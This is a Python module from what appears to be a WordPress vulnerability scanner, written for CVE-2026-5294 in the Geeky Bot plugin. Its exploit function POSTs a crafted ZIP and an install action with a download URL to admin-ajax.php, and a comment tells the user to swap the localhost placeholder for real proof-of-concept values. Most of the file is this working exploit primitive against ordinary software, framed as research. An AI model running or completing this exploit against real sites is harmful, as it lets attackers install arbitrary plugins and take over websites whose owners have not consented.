# Made by Sn0w8ird

from __future__ import annotations

from cpointed.core.engine import ScanResult, Target
from cpointed.core.session import CPointedClient
from cpointed.modules.wordpress.base import WordPressModule


class CVE20265294GeekyBot(WordPressModule):
    name = "CVE-2026-5294"
    severity = 8.5
    affected_versions = ["Geeky Bot: CVSS pending vendor confirmation"]
    cwe = "CWE-434 / plugin install primitive (research)"
    plugin_readme_paths = (
        "/wp-content/plugins/geeky-bot/readme.txt",
        "/wp-content/plugins/geekybot/readme.txt",
    )
    slug_hint = "geeky"

    async def exploit_remote_primitive(
        self,
        target: Target,
        client: CPointedClient,
        *,
        timeout: float,
    ) -> dict:
        """Addon install primitive: empty ZIP marker + handler action (replace URL/slug with PoC values)."""
        ajax = self._path(target, "/wp-admin/admin-ajax.php")
        out: dict = {"admin_ajax_posts": []}
        try:
            minimal_zip = (
                b"PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00"
                b"readme.txt\x01\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            )
            files = {"addon_zip": ("cpointed-probe.zip", minimal_zip, "application/zip")}
            data = {
                "action": "geekybot_download_and_install_plugin",
                "plugin_slug": "cpointed-probe",
                "download_url": "http://127.0.0.1:9/cpointed-probe.zip",
            }
            r = await client.request("POST", ajax, data=data, files=files, timeout=timeout)
            out["admin_ajax_posts"].append(
                {
                    "path": ajax,
                    "action": data["action"],
                    "status_code": r.status_code,
                    "body_snippet": (r.text or "")[:2000],
                }
            )
        except Exception as exc:  # pragma: no cover - network
            out["admin_ajax_posts"].append(
                {"action": "geekybot_download_and_install_plugin", "error": str(exc)}
            )
        return out

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
